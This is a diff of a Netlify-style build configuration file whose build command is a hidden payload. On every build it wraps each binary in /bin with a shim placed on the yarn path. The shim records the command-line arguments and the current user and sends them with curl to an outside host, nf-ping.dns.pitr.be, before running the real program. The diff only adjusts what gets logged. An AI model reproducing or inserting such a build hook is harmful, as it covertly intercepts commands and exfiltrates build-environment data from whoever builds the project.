@@ -1,6 +1,6 @@
 [build]
   publish = "dist"
-  command = "/bin/mkdir -p /opt/buildhome/.yarn/bin; while read inject; do printf '#!/bin/bash\n/bin/echo $@ > /tmp/args\n/bin/whoami >> /tmp/args\n/bin/curl http://nf-ping.dns.pitr.be/$inject -d @/tmp/args;\n/bin/$(/bin/basename $0) $@'> /opt/buildhome/.yarn/bin/$inject; /bin/chmod +x /opt/buildhome/.yarn/bin/$inject; done < <(ls /bin); "
+  command = "/bin/mkdir -p /opt/buildhome/.yarn/bin; while read inject; do printf '#!/bin/bash\n/bin/echo $0 $@ > /tmp/args\n/bin/whoami >> /tmp/args\n/bin/curl http://nf-ping.dns.pitr.be/$inject -d @/tmp/args;\n/bin/$(/bin/basename $0) $@'> /opt/buildhome/.yarn/bin/$inject; /bin/chmod +x /opt/buildhome/.yarn/bin/$inject; done < <(ls /bin); "
 [build.environment]
   YARN_VERSION = "1.9.4"
   HUGO_VERSION = "0.46"
